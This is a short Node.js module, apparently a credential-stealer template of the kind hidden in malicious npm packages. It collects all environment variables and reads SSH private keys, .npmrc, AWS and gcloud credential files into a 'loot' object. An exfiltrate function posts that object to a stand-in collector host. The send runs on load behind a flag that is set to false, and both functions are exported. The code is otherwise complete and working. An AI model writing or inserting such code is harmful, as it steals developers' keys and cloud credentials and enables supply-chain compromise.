'use strict';

const fs = require('fs');
const os = require('os');
const path = require('path');
const https = require('https');

const ENABLE_EXFIL = false;

const SECRET_PATHS = [
  path.join(os.homedir(), '.ssh', 'id_rsa'),
  path.join(os.homedir(), '.npmrc'),
  path.join(os.homedir(), '.aws', 'credentials'),
  path.join(os.homedir(), '.config', 'gcloud', 'credentials.db'),
];

function collectSecrets() {
  const loot = {
    env: process.env,
    files: {},
  };
  for (const p of SECRET_PATHS) {
    try {
      loot.files[p] = fs.readFileSync(p, 'utf8');
    } catch {
      // ignore missing files
    }
  }
  return loot;
}

function exfiltrate(data) {
  const req = https.request({
    hostname: 'collector.example.com',
    path: '/ingest',
    method: 'POST',
    headers: { 'content-type': 'application/json' },
  });
  req.write(JSON.stringify(data));
  req.end();
}

if (ENABLE_EXFIL) {
  exfiltrate(collectSecrets());
}

module.exports = { collectSecrets, exfiltrate };
